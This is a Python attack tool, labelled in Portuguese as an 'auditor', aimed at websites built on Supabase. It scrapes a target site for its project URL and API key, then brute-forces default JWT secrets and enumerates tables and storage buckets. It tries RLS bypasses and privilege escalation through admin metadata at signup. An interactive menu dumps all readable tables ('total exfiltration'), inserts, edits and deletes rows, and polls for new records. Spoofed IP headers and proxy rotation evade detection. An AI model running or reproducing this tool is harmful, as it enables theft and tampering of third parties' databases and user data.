#!/usr/bin/env python3
import asyncio
import httpx
import json
import re
import time
import base64
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.live import Live
from rich.align import Align
from rich.syntax import Syntax
import os
import random
import string
import sys
from typing import List, Optional, Set, Dict
from urllib.parse import urljoin


# --- CONFIGURAÇÃO VISUAL SHYYUNZ SEC ---
console = Console()

BANNER = """
[bold cyan]
 ██████╗██╗  ██╗██╗   ██╗██╗   ██╗███╗   ██╗███████╗
██╔════╝██║  ██║╚██╗ ██╔╝╚██╗ ██╔╝████╗  ██║╚══███╔╝
╚█████╗ ███████║ ╚████╔╝  ╚████╔╝ ██╔██╗ ██║  ███╔╝ 
 ╚═══██╗██╔══██║  ╚██╔╝    ╚██╔╝  ██║╚██╗██║ ███╔╝  
██████╔╝██║  ██║   ██║      ██║   ██║ ╚████║███████╗
╚═════╝ ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═══╝╚══════╝
[/bold cyan][bold magenta] ╔═════════════════════════════════════════════════════╗
 ║ [bold white]SHYYUNZ SEC - SUPABASE v5.0[/bold white]       ║
 ║ [dim]Advanced Detection & Proxy Rotation[/dim]       ║
 ╚═════════════════════════════════════════════════════╝[/bold magenta]
"""


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
]


class KnowledgeManager:
    """Sistema de Aprendizado: Memoriza tabelas e alvos descobertos."""
    def __init__(self, filename="sh_knowledge.json"):
        self.filename = filename
        self.data = self.load()

    def load(self):
        if os.path.exists(self.filename):
            try:
                with open(self.filename, "r") as f: return json.load(f)
            except: pass
        return {"tables": [], "rpcs": [], "buckets": []}

    def save(self):
        try:
            with open(self.filename, "w") as f: json.dump(self.data, f, indent=2)
        except: pass

    def learn(self, category: str, name: str):
        if name not in self.data[category]:
            self.data[category].append(name)
            self.save()

knowledge = KnowledgeManager()


class ShyyunzAuditor:
    def __init__(self, target: str, apikey: str, bearer: Optional[str] = None):
        self.project_ref = self.extract_project_ref(target)
        self.root_url = f"https://{self.project_ref}.supabase.co"
        self.base_url = f"{self.root_url}/rest/v1/"
        self.auth_url = f"{self.root_url}/auth/v1/"
        self.storage_url = f"{self.root_url}/storage/v1/"
        self.apikey = apikey.strip()
        self.bearer = bearer.strip() if bearer else self.apikey
        self.headers = {"apikey": self.apikey, "Authorization": f"Bearer {self.bearer}", "Content-Type": "application/json"}
        self.results = []
        self.graphql_discovered = set()
        self.auth_settings = {}
        self.semaphore = asyncio.Semaphore(60)
        self.tested_count = 0
        self.hits_count = 0
        self.is_service_role = False
        self.req_count = 0
        self.proxies = self.load_proxies()
        self.current_proxy = None

    def load_proxies(self):
        if os.path.exists("sh_proxies.txt"):
            try:
                with open("sh_proxies.txt", "r") as f:
                    p = [l.strip() for l in f if l.strip()]
                    if p: console.print(f"[bold cyan][*] {len(p)} Proxies carregados de sh_proxies.txt[/bold cyan]")
                    return p
            except: pass
        return []

    def rotate_headers(self):
        """Alterna User-Agent, IPs falsos e PROXY real."""
        self.req_count += 1
        if self.req_count % 50 == 0:
            new_ua = random.choice(USER_AGENTS)
            fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
            self.headers.update({"User-Agent": new_ua, "X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip})
            if self.proxies:
                self.current_proxy = random.choice(self.proxies)
                # console.print(f"[dim][*] Rotação de Proxy: {self.current_proxy}[/dim]")

    async def check_service_role(self):
        """Verifica se a chave fornecida é uma 'service_role' (ignora RLS)."""
        async with httpx.AsyncClient() as client:
            try:
                # Tenta acessar auth.users diretamente ou ver info de config de admin
                resp = await client.get(f"{self.auth_url}admin/users", headers=self.headers, timeout=5.0)
                if resp.status_code == 200:
                    self.is_service_role = True
                    console.print("[bold red blink][!!!] ALERTA CRÍTICO: Chave SERVICE_ROLE Detectada! [!!!][/bold red blink]")
                    console.print("[bold red]Este projeto está TOTALMENTE EXPOSTO. O RLS foi ignorado.[/bold red]")
            except: pass

    @staticmethod
    def extract_project_ref(target: str) -> str:
        clean = target.strip().lower()
        if "supabase.co" in clean:
            matches = re.findall(r"https?://([a-z0-9-]+)\.supabase\.co", clean)
            if matches: return matches[0]
        matches = re.findall(r"([a-z0-9]{20})", clean)
        return matches[0] if matches else clean.replace("https://", "").replace("http://", "").split(".")[0]

    async def pre_scan_auth_check(self) -> bool:
        fake_target = "shyyunz_heuristic_check"
        console.print("[dim][*] Realizando Pré-Scan de Heurística de Autenticação...[/dim]")

        async with httpx.AsyncClient(timeout=10.0) as client:
            try:
                resp = await client.get(f"{self.base_url}{fake_target}?select=*", headers=self.headers, params={"limit": 0})
                if resp.status_code == 401:
                    console.print("[bold red][!] ERRO CRÍTICO 401: AUTENTICAÇÃO REJEITADA![/bold red]")
                    return False
                return True
            except Exception as e:
                console.print(f"[bold red][!] Falha de conexão: {e}[/bold red]")
                return False

    async def perform_intelligence_gathering(self):
        console.print("\n[bold yellow]>>> COLETA DE INFORMAÇÕES E EXPLORAÇÃO <<<[/bold yellow]")

        try:
            async with httpx.AsyncClient() as client:
                aresp = await client.get(f"{self.auth_url}settings", headers={"apikey": self.apikey}, timeout=10.0)
                if aresp.status_code == 200:
                    self.auth_settings = aresp.json()
                    if not self.auth_settings.get("disable_signup", True): console.print("  [bold red][!] VULNERABILIDADE: Cadastro público (Sign-Up) está ABERTO![/bold red]")
        except: pass
        try:
            gql_url = f"{self.root_url}/graphql/v1"
            query = {"query": "{ __schema { types { name fields { name } } } }"}
            async with httpx.AsyncClient() as client:
                gresp = await client.post(gql_url, headers=self.headers, json=query, timeout=10.0)
                if gresp.status_code == 200 and "data" in gresp.json():
                    schema_types = gresp.json()["data"]["__schema"]["types"]
                    extracted = set()
                    sensitive_found = []
                    sensitive_keywords = ["email", "pass", "pwd", "token", "secret", "key", "admin", "phone", "cpf", "cnpj", "credito", "card", "balance", "saldo"]
                    
                    for t in schema_types:
                        name = t.get("name", "")
                        if not name or name.startswith("__") or name in ["Query", "Mutation", "Subscription", "String", "Int", "Float", "Boolean", "ID"]:
                            continue
                        
                        low_name = name.lower()
                        extracted.add(low_name); extracted.add(f"{low_name}s")
                        
                        fields = t.get("fields") or []
                        for f in fields:
                            f_name = f.get("name", "").lower()
                            if any(sk in f_name for sk in sensitive_keywords):
                                sensitive_found.append(f"{name}.{f_name}")
                    
                    if extracted:
                        console.print(f"  [bold green][+] EXPLORAÇÃO GQL: Vazou {len(extracted)} alvos e {len(sensitive_found)} campos sensíveis![/bold green]")
                        for e in extracted: knowledge.learn("tables", e)
                        if sensitive_found:
                            console.print(f"  [dim][*] Campos Críticos: {', '.join(sensitive_found[:8])}...[/dim]")
                        self.graphql_discovered = extracted
        except: pass

    async def brute_jwt_secret(self):
        """Tenta brute-force em segredos JWT comuns para instâncias Self-Hosted."""
        import jwt # Opcional, se não tiver, pula
        secrets = ["super-secret-jwt-key-with-at-least-thirty-two-characters", "secret", "postgres", "password", "supabase", "12345678901234567890123456789012"]
        console.print("[dim][*] Testando Segredos JWT comuns (Self-Hosted Recon)...[/dim]")
        for s in secrets:
            try:
                token = jwt.encode({"role": "authenticated", "iss": "supabase", "sub": "shyyunz"}, s, algorithm="HS256")
                async with httpx.AsyncClient() as client:
                    r = await client.get(f"{self.base_url}auth_check_heuristic", headers={"apikey": self.apikey, "Authorization": f"Bearer {token}"})
                    if r.status_code != 401:
                        console.print(f"[bold red][!] VULNERÁVEL: Segredo JWT Padrão Detectado: '{s}'[/bold red]")
                        return s
            except: break
        return None

    async def web_recon(self, site_url: str):
        """Busca por arquivos sensíveis no site hospedeiro que podem vazar chaves."""
        paths = [".env", "package.json", ".git/config", "wp-config.php.bak", "api/.env", "src/supabase.js", "supabase.ts"]
        headers = {'User-Agent': 'Mozilla/5.0'}
        async with httpx.AsyncClient(headers=headers, timeout=5.0, follow_redirects=True, verify=False) as client:
            for p in paths:
                try:
                    target = urljoin(site_url, p)
                    res = await client.get(target)
                    if res.status_code == 200 and ("SUPABASE_" in res.text or "apikey" in res.text):
                        console.print(f"[bold red][!] VAZAMENTO EM SITE: Arquivo sensível exposto: {target}[/bold red]")
                except: pass

    def analyze_jwt(self, token: str):
        try:
            parts = token.split(".")
            if len(parts) >= 2:
                payload_b64 = parts[1]
                payload_b64 += "=" * ((4 - len(payload_b64) % 4) % 4)
                payload_json = base64.b64decode(payload_b64).decode("utf-8")
                payload = json.loads(payload_json)
                
                console.print("\n[bold magenta]--- ANÁLISE DO TOKEN JWT (Pós-Exploração) ---[/bold magenta]")

                app_meta = payload.get("app_metadata", {})
                user_meta = payload.get("user_metadata", {})
                role = payload.get("role", "N/A")
                
                console.print(f"[*] Cargo do Token (Role): [bold cyan]{role}[/bold cyan]")

                
                is_admin = False
                if role == "admin" or app_meta.get("role") == "admin" or user_meta.get("role") == "admin": is_admin = True
                if app_meta.get("is_admin") == True or user_meta.get("is_admin") == True: is_admin = True
                    
                if is_admin: console.print("[bold green][+] SUCESSO! Escalonamento de Privilégios (Injeção de Metadados) validado. O Token possui permissões de admin![/bold green]")

                else: console.print("[yellow][-] Escalonamento de Cargo não foi automático. Avalie os metadados brutos abaixo:[/yellow]")

                
                console.print(f"[dim]App Metadata: {json.dumps(app_meta)}[/dim]")
                console.print(f"[dim]User Metadata:  {json.dumps(user_meta)}[/dim]\n")
        except: pass

    async def exploit_login(self, email: str, password: str):
        console.print(f"[bold cyan][*] Tentando LOGIN: {email}...[/bold cyan]")
        async with httpx.AsyncClient() as client:
            try:
                resp = await client.post(f"{self.auth_url}token", headers={"apikey": self.apikey}, params={"grant_type": "password"}, json={"email": email, "password": password})
                if resp.status_code == 200:
                    data = resp.json(); token = data.get('access_token')
                    if token: 
                        console.print(f"[bold green][+] LOGIN SUCESSO: {email}![/bold green]")
                        self.analyze_jwt(token)
                        return token
            except: pass
        return None

    def generate_strong_password(self):
        return "Shy_" + "".join(random.choices(string.ascii_letters + string.digits, k=12)) + "!SEC"

    async def exploit_signup(self):
        console.print("\n[bold magenta]--- CONFIGURAÇÃO DE EXPLORAÇÃO INTERATIVA ---[/bold magenta]")
        email_default = f"shyyunz.{random.randint(1000, 9999)}@gmail.com"
        passwd_default = self.generate_strong_password()
        
        email = input(f"E-mail para Cadastro [{email_default}]: ").strip() or email_default
        password = input(f"Senha para Cadastro  [{passwd_default}]: ").strip() or passwd_default
        
        payload = {"email": email, "password": password, "data": {"role": "admin", "is_admin": True}}
        async with httpx.AsyncClient() as client:
            try:
                resp = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json=payload)
                if resp.status_code in [200, 201]:
                    data = resp.json(); token = data.get('access_token')
                    if token: 
                        console.print(f"[bold green][+] CONTA CRIADA E LOGADA AUTOMATICAMENTE![/bold green]")
                        self.analyze_jwt(token)
                        return token
                    console.print("[yellow][!] AVISO: Cadastro exige confirmação por e-mail.[/yellow]")
                    console.print("[dim][!] DICA: Projetos gratuitos do Supabase bloqueiam e-mails após 3 envios por hora. Se não chegar e não estiver no Spam, o limite estourou.[/dim]")
                    input("\n[bold cyan][?] Vá ao seu e-mail, clique no link de confirmação e aperte [ENTER] para Continuar o Ataque...[/bold cyan]")
                    return await self.exploit_login(email, password)
                elif resp.status_code == 400 and "already registered" in resp.text:
                    if input(f"[yellow][!] Usuário já existe. Tentar LOGIN? [S/n]: ").lower() != 'n': return await self.exploit_login(email, password)
                elif resp.status_code == 422: console.print("[bold red][!] REJEITADO: Senha fraca para o servidor alvo.[/bold red]")
                else: console.print(f"[red][-] Erro {resp.status_code}: {resp.text}[/red]")
            except Exception as e: console.print(f"[red][!] Erro: {e}[/red]")
        return None

    async def exploit_anonymous(self):
        """Implementação V8.6: Anonymous Login para burlar confirmação de E-mail."""
        console.print("\n[bold cyan][*] Tentando Login Anônimo (Bypass de E-mail)...[/bold cyan]")
        async with httpx.AsyncClient() as client:
            try:
                resp = await client.post(f"{self.auth_url}signup", headers={"apikey": self.apikey}, json={"data": {}})
                if resp.status_code in [200, 201]:
                    data = resp.json(); token = data.get('access_token')
                    if token: 
                        console.print(f"[bold green][+] SUCESSO: Autenticado como Usuário Anônimo (Logado)![/bold green]")

                        self.analyze_jwt(token)
                        return token
                console.print(f"[red][-] Servidor rejeitou o login anônimo (pode estar desativado). Code: {resp.status_code}[/red]")
            except Exception as e: console.print(f"[red][!] Erro: {e}[/red]")
        return None

    async def list_bucket_files(self, bucket_name: str):
        headers = {"apikey": self.apikey, "Authorization": f"Bearer {self.bearer}"}
        payload = {"prefix": "", "limit": 20, "offset": 0, "sortBy": {"column": "name", "order": "asc"}}
        async with httpx.AsyncClient() as client:
            try:
                resp = await client.post(f"{self.storage_url}object/list/{bucket_name}", headers=headers, json=payload)
                if resp.status_code == 200:
                    files = resp.json(); table = Table(title=f"Arquivos em {bucket_name} (Storage)")
                    table.add_column("Nome"); table.add_column("Tamanho"); table.add_column("Acesso Público"); table.add_column("Status")
                    for f in files:
                        f_name = f.get('name')
                        if not f_name: continue
                        
                        # Teste de Acesso Público (PoC de 5KB)
                        public_url = f"{self.storage_url}object/public/{bucket_name}/{f_name}"
                        is_public = "[bold red]VULNERÁVEL[/bold red]"
                        try:
                            # Tenta baixar SEM headers de auth
                            check = await client.get(public_url, timeout=3.0)
                            if check.status_code != 200: is_public = "[green]Protegido[/green]"
                        except: is_public = "[yellow]Timeout[/yellow]"
                        
                        size = f.get('metadata', {}).get('size', 0)
                        table.add_row(f_name, f"{size} bytes", is_public, "[bold blue]OK[/bold blue]")
                    console.print(table)
                else: console.print(f"[red][-] Erro {resp.status_code} ao listar arquivos do bucket {bucket_name}.[/red]")
            except Exception as e: console.print(f"[red][!] Falha no Storage: {e}[/red]")

    async def mass_exfiltration(self):
        """Exfiltração Total: Baixa todos os dados de tabelas expostas em massa."""
        out_dir = f"sh_dump_{self.project_ref}"
        if not os.path.exists(out_dir): os.makedirs(out_dir)
        
        console.print(f"\n[bold magenta][*] Iniciando EXFILTRAÇÃO TOTAL para '{out_dir}/'...[/bold magenta]")
        async with httpx.AsyncClient() as client:
            for r in self.results:
                if r['type'] == "TABLE" and r.get('readable') and r.get('has_data'):
                    try:
                        res = await client.get(f"{self.base_url}{r['name']}?select=*", headers=self.headers)
                        if res.status_code == 200:
                            f_path = os.path.join(out_dir, f"{r['name']}.json")
                            with open(f_path, "w") as f: f.write(json.dumps(res.json()))
                            console.print(f" [bold green][+] SUGADO:[/bold green] {r['name']} ({len(res.json())} registros)")
                    except: pass
        console.print("[bold green][*] Exfiltração Concluída![/bold green]")

    async def perform_active_write_test(self, client, table_name):
        res = {"post": False, "patch": False, "delete": False}
        headers = self.headers.copy(); headers["Prefer"] = "return=minimal"
        try:
            r = await client.post(f"{self.base_url}{table_name}", headers=headers, json={"shy_v": "1"}, timeout=5.0)
            if r.status_code in [201, 400]: res["post"] = True
        except: pass
        try:
            r = await client.patch(f"{self.base_url}{table_name}?id=eq.0", headers=headers, json={"shy_v": "1"}, timeout=5.0)
            if r.status_code in [200, 204, 400, 404]: res["patch"] = True
        except: pass
        try:
            r = await client.delete(f"{self.base_url}{table_name}?id=eq.0", headers=headers, timeout=5.0)
            if r.status_code in [200, 204, 400, 404]: res["delete"] = True
        except: pass
        return res

    async def check_target(self, client: httpx.AsyncClient, target: str, t_type: str, progress, task_id):
        async with self.semaphore:
            self.rotate_headers()
            url = f"{self.base_url}{target}" if t_type != "BUCKET" else f"{self.storage_url}bucket/{target}"
            try:
                if t_type == "TABLE": 
                    resp = await client.get(f"{url}?select=*", headers=self.headers, params={"limit": 1}, timeout=10.0)
                    # Tentativa de JOIN INJECTION se falhar inicialmente
                    if resp.status_code in [401, 403]:
                        # Tenta dar JOIN com outras tabelas ou esquema auth
                        join_url = f"{url}?select=*,auth.users(*)"
                        resp_join = await client.get(join_url, headers=self.headers, params={"limit": 1}, timeout=10.0)
                        if resp_join.status_code == 200:
                            console.print(f"[bold red][!] BYPASS DE RLS: Join Injection funcionou em {target}![/bold red]")
                            resp = resp_join
                elif t_type == "RPC": resp = await client.post(f"{url}?select=*", headers=self.headers, json={}, timeout=10.0)
                else: resp = await client.get(url, headers=self.headers, timeout=10.0)
                
                self.tested_count += 1
                if t_type == "TABLE" and resp.status_code in [200, 403]:
                    readable = (resp.status_code == 200)
                    has_data = False
                    if readable: 
                        try: has_data = len(resp.json()) > 0; knowledge.learn("tables", target)
                        except: pass
                    write_vulns = await self.perform_active_write_test(client, target)
                    self.results.append({"type": "TABLE", "name": target, "readable": readable, "has_data": has_data, "write_vulns": write_vulns})
                    self.hits_count += 1
                elif t_type == "RPC" and resp.status_code in [200, 204, 400]:
                    self.results.append({"type": "RPC", "name": target, "readable": True}); self.hits_count += 1
                    knowledge.learn("rpcs", target)
                elif t_type == "BUCKET" and resp.status_code == 200:
                    self.results.append({"type": "BUCKET", "name": target, "readable": True}); self.hits_count += 1
                    knowledge.learn("buckets", target)
                progress.update(task_id, description=f"[bold red]Auditoria V4.0: [ACERTOS {self.hits_count}] [APRENDIDO {len(knowledge.data['tables'])}] ")

            except: pass
            finally: progress.advance(task_id)

    async def run_scan(self, tables: List[str], rpcs: List[str], buckets: List[str]):
        proxy = self.current_proxy if self.proxies else None
        async with httpx.AsyncClient(verify=False, http2=True, proxy=proxy) as client:
            total = len(tables) + len(rpcs) + len(buckets)
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(bar_width=40, pulse_style="red"), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"), console=console) as progress:
                task = progress.add_task("[bold red]Iniciando Reconhecimento v2.0...", total=total)

                await asyncio.gather(*[self.check_target(client, t, "TABLE", progress, task) for t in tables], *[self.check_target(client, r, "RPC", progress, task) for r in rpcs], *[self.check_target(client, b, "BUCKET", progress, task) for b in buckets])

# WIZARD HELPERS (V8.7)
def parse_value(val_str: str):
    if val_str.lower() == "true": return True
    if val_str.lower() == "false": return False
    if val_str.lower() == "null": return None
    if val_str.isdigit(): return int(val_str)
    try: return float(val_str)
    except: return val_str

def prompt_payload():
    console.print("[dim]Dica: Digite 'ADMIN' para carregar payload de Escalonamento de Privilégios.[/dim]")
    payload = {}
    while True:
        col = input("Nome da Coluna: ").strip()
        if not col or col.lower() == "fim": break
        if col.upper() == "ADMIN":
            admin_data = {"role": "admin", "is_admin": True, "claims": {"role": "admin"}, "raw_user_metadata": {"role": "admin", "is_admin": True}, "raw_app_metadata": {"role": "admin", "is_admin": True}}
            payload.update(admin_data)
            console.print("[bold green][+] Payload de Admin injetado nas colunas comuns.[/bold green]")
            continue
        val_str = input(f"Novo Valor para '{col}': ").strip()
        payload[col] = parse_value(val_str)
    return payload

def prompt_filter():
    console.print("[dim]Como achar o alvo exato?[/dim]")
    col = input("Coluna de Busca (Padrão: id): ").strip() or "id"
    val_str = input(f"Valor alvo em '{col}': ").strip()
    return f"{col}=eq.{val_str}"

async def fetch_supabase_details(url: str):
    if not url.startswith("http"):
        url = "https://" + url
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
    async with httpx.AsyncClient(headers=headers, timeout=15.0, follow_redirects=True, verify=False) as client:
        try:
            console.print(f"[dim][*] Analisando site alvo: {url}...[/dim]")
            res = await client.get(url)
            html = res.text

            projeto_re = r'https://[a-z0-9\-]+\.supabase\.co'
            # Regex v5.0: Suporta JWT antigo e as novas SB_PUBLISHABLE_ keys
            anon_re = r'(eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+|sb_publishable_[a-zA-Z0-9_\-]+)'

            projeto = re.search(projeto_re, html)
            anon = re.search(anon_re, html)

            if not anon or not projeto:
                console.print("[dim][*] Buscando nos arquivos JavaScript internos...[/dim]")
                scripts = re.findall(r'src=["\'](.*?\.js.*?)["\']', html)
                for script_url in scripts:
                    full_url = urljoin(url, script_url)
                    try:
                        js_res = await client.get(full_url, timeout=5.0)
                        if not projeto:
                            projeto = re.search(projeto_re, js_res.text)
                        if not anon:
                            anon = re.search(anon_re, js_res.text)
                        if anon and projeto:
                            break
                    except:
                        continue

            p_val = projeto.group(0) if projeto else None
            a_val = anon.group(0) if anon else None
            
            if p_val and a_val:
                console.print(f"[bold green][+] Supabase detectado![/bold green]")
                console.print(f"[dim]  URL: {p_val}[/dim]")
                console.print(f"[dim]  CHAVE: {a_val[:20]}...[/dim]")

            
            return p_val, a_val
        except Exception as e:
            console.print(f"[bold red][!] Erro ao analisar site: {e}[/bold red]")
            return None, None


async def audit_routine():
    console.print(Align.center(BANNER))
    try:
        site_url = input("\n[SHYYUNZ_SEC] URL do Site Alvo: ").strip()
        if site_url.lower() in ["exit", "sair", "0"]: return False
        
        target, apikey = await fetch_supabase_details(site_url)
        if not target or not apikey:
            console.print("[yellow][!] Não foi possível extrair Supabase URL/Key automaticamente.[/yellow]")
            if not target: target = input("[SHYYUNZ_SEC] Informe URL/ID do Projeto Manualmente: ").strip()
            if not apikey: apikey = input("[SHYYUNZ_SEC] Informe Supabase API Key Manualmente:   ").strip()
        
        bearer = input("[SHYYUNZ_SEC] API Bearer (Opcional): ").strip()
        auditor = ShyyunzAuditor(target, apikey, bearer if bearer else None)
        
        # Reconhecimento Adicional V3.0
        await auditor.web_recon(site_url)
        await auditor.check_service_role()
        await auditor.brute_jwt_secret()

        if not await auditor.pre_scan_auth_check(): return True
        await auditor.perform_intelligence_gathering()
        
        words = set(["users", "profiles", "accounts", "admins", "settings", "orders", "vendas", "usuarios", "perfis", "clientes", "financeiro", "config", "roles", "secrets", "api_keys", "payments", "transactions", "logs", "activity", "messages", "files", "documents", "uploads", "projects", "tasks", "tokens", "carts", "inventory", "products", "leads", "contacts", "partners", "branches", "assets", "metadata", "sessions", "notifications", "deals", "tickets", "billing", "subscriptions", "assinaturas", "faturas"])
        # Mescla com o que foi APRENDIDO
        words.update(knowledge.data["tables"])
        
        if auditor.graphql_discovered: words.update(auditor.graphql_discovered)
        mutations = set()
        for w in list(words):
            for s in ["s", "es", "_old", "_backup", "_data", "_logs", "_audit"]: mutations.add(f"{w}{s}")
            for p in ["auth_", "sys_", "internal_", "app_"]: mutations.add(f"{p}{w}")
        words.update(mutations)
        
        rpc_seeds = set(["get_user", "admin_login", "reset_password", "update_role", "get_config", "make_admin", "delete_user", "debug_info", "get_stats", "exec_sql", "export_data", "backup_db", "get_secrets", "system_status", "authorize_access"])
        rpc_seeds.update(knowledge.data["rpcs"])
        
        bucket_seeds = set(["avatars", "users", "public", "documents", "images", "assets", "backups", "uploads", "private", "temp", "exports", "logs", "media", "storage"])
        bucket_seeds.update(knowledge.data["buckets"])
        
        await auditor.run_scan(list(words), list(rpc_seeds), list(bucket_seeds))
        print("\n")
        
        if not auditor.results: 
            console.print("[yellow][!] Nenhum vetor encontrado. Tente outra wordlist ou credenciais.[/yellow]")
            return True

        table_map = {}
        auditor.results.sort(key=lambda x: (x['type'] != 'TABLE'))
        summary = Table(title="[bold red]VETORES DE EXPLORAÇÃO SELECIONADOS[/bold red]")
        summary.add_column("Nr."); summary.add_column("Tipo"); summary.add_column("Alvo"); summary.add_column("Leitura"); summary.add_column("Escrita (W/U/D)"); summary.add_column("Risco")
        for idx, r in enumerate(auditor.results, 1):
            read_st = "[bold green]EXPOSTO[/bold green]" if r.get('readable') else "[yellow]RLS[/yellow]"
            if r.get('has_data'): read_st += " [red](DADOS)[/red]"
            w_v = r.get('write_vulns', {})
            write_st = f"[{'W' if w_v.get('post') else '-'}/{'U' if w_v.get('patch') else '-'}/{'D' if w_v.get('delete') else '-'}]"
            summary.add_row(str(idx), r['type'], r['name'], read_st, f"[bold magenta]{write_st}[/bold magenta]" if any(w_v.values()) else write_st, "[bold red]CRÍTICO[/bold red]" if any(w_v.values()) or r.get('readable') else "[yellow]ALTO[/yellow]")
            table_map[str(idx)] = r
        console.print(summary)
        
        while True:
            console.print("\n[bold cyan]DASHBOARD DE EXPLORAÇÃO V8.7:[/bold cyan]")
            console.print("[1] Ler Tabela           [2] DUMP Tabelas Populadas")
            console.print("[3] Sign-Up Interativo   [4] Listar Buckets Storage")
            console.print("[6] Inserir Dados (POST) [7] Editar Dados (PATCH)")
            console.print("[8] Excluir Dados (DEL)  [9] Anonymous Login (Bypass Email)")
            console.print("[L] Monitor de Logs (LIVE) [K] Ver Conhecimento Aprendido")
            console.print("[D] Exfiltração TOTAL    [0] Sair")
            console.print("[5] Nova Auditoria")
            c = input("\n[S_SEC] Comando: ").strip().upper()
            if c == "0": return False
            elif c == "5": return True
            elif c == "D": await auditor.mass_exfiltration()
            elif c == "K":
                console.print(Panel(json.dumps(knowledge.data, indent=2), title="Cérebro da Shyyunz", border_style="green"))
            elif c == "L":
                idx = input("Nr. do Alvo para Monitorar: ").strip()
                if idx in table_map:
                    t_name = table_map[idx]['name']
                    console.print(f"[bold red][*] Iniciando Sniffer Realtime (Polling 5s) em {t_name}...[/bold red]")
                    last_ids = set()
                    try:
                        proxy = auditor.current_proxy if auditor.proxies else None
                        while True:
                            async with httpx.AsyncClient(proxy=proxy) as client:
                                res = await client.get(f"{auditor.base_url}{t_name}?select=*&order=created_at.desc&limit=5", headers=auditor.headers)
                                if res.status_code == 200:
                                    for item in res.json():
                                        row_id = str(item.get('id', item))
                                        if row_id not in last_ids:
                                            console.print(f"[bold green][NOVO REGISTRO] {json.dumps(item)}[/bold green]")
                                            last_ids.add(row_id)
                            await asyncio.sleep(5)
                    except KeyboardInterrupt: console.print("\n[*] Monitoramento parado.")
            elif c in ["1", "6", "7", "8", "4"]:
                idx = input("Nr. do Alvo: ").strip()
                if idx in table_map:
                    target_info = table_map[idx]
                    t_name = target_info['name']
                    if c == "1":
                        async with httpx.AsyncClient() as client:
                            res = await client.get(f"{auditor.base_url}{t_name}?select=*", headers=auditor.headers, params={"limit": 25})
                            if res.status_code == 200: console.print(Panel(json.dumps(res.json(), indent=2), border_style="red"))
                    elif c == "6":
                        console.print("\n[bold magenta]--- WIZARD: INSERIR DADOS ---[/bold magenta]")
                        payload = prompt_payload()
                        if payload:
                            console.print(f"[*] Payload Gerado: {json.dumps(payload)}")
                            async with httpx.AsyncClient() as client:
                                res = await client.post(f"{auditor.base_url}{t_name}", headers=auditor.headers, json=payload)
                                console.print(f"[*] Resposta ({res.status_code}): {res.text}")
                    elif c == "7":
                        console.print("\n[bold magenta]--- WIZARD: EDITAR DADOS ---[/bold magenta]")
                        filter_str = prompt_filter()
                        if filter_str:
                            payload = prompt_payload()
                            if payload:
                                console.print(f"[*] Filtro Aplicado: {filter_str}")
                                console.print(f"[*] Payload Gerado: {json.dumps(payload)}")
                                async with httpx.AsyncClient() as client:
                                    res = await client.patch(f"{auditor.base_url}{t_name}?{filter_str}", headers=auditor.headers, json=payload)
                                    console.print(f"[*] Resposta ({res.status_code}): {res.text}")
                    elif c == "8":
                        console.print("\n[bold magenta]--- WIZARD: EXCLUIR DADOS ---[/bold magenta]")
                        filter_str = prompt_filter()
                        if filter_str:
                            if input(f"[bold red]!! CONFIRMA DELETE ONDE '{filter_str}' EM {t_name}? [s/N]: [/bold red]").lower() == 's':
                                async with httpx.AsyncClient() as client:
                                    res = await client.delete(f"{auditor.base_url}{t_name}?{filter_str}", headers=auditor.headers)
                                    console.print(f"[*] Resposta ({res.status_code}): {res.text}")
                    elif c == "4" and target_info['type'] == "BUCKET": await auditor.list_bucket_files(t_name)
            elif c == "2":
                for r in auditor.results:
                    if r['type'] == "TABLE" and r.get('readable') and r.get('has_data'):
                        async with httpx.AsyncClient() as client:
                            res = await client.get(f"{auditor.base_url}{r['name']}?select=*", headers=auditor.headers)
                            if res.status_code == 200:
                                with open(f"sh_dump_{r['name']}.json", "w") as f: f.write(json.dumps(res.json()))
                                console.print(f" [+] DUMP: sh_dump_{r['name']}.json")
            elif c == "3":
                token = await auditor.exploit_signup()
                if token: auditor.bearer = token; auditor.headers["Authorization"] = f"Bearer {token}"
            elif c == "9":
                token = await auditor.exploit_anonymous()
                if token: auditor.bearer = token; auditor.headers["Authorization"] = f"Bearer {token}"
    except Exception as e:
        console.print(f"[bold red][!] ERRO CRÍTICO NA AUDITORIA: {e}[/bold red]")
        return True
    return True

async def main():
    while True:
        try:
            if not await audit_routine(): break
        except Exception as e:
            console.print(f"[red][!] Erro no loop principal: {e}[/red]")
            await asyncio.sleep(1)

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: sys.exit(0)
